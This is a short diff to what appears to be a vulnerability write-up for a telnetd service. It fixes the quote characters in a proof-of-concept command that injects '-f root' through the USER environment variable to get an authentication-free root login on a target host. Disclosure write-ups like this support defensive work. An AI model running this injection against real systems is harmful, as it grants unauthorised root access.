@@ -73,7 +73,7 @@ The following is the Telnetd service configuration on the target host side.
 
 ### 🧪 Proof of Concept (PoC)
 
-And here is the Proof of Concept (PoC) for this vulnerability, which can be executed manually from the attacker's host simply by running the command `USER=“-f root” telnet -a <TARGET_HOST> 23`.
+And here is the Proof of Concept (PoC) for this vulnerability, which can be executed manually from the attacker's host simply by running the command `USER="-f root" telnet -a <TARGET_HOST> 23`.
 <p align="center">
   <img
     src="https://github.com/user-attachments/assets/2710b1b6-74cf-4f6a-87d3-981d7f1eaa6e"
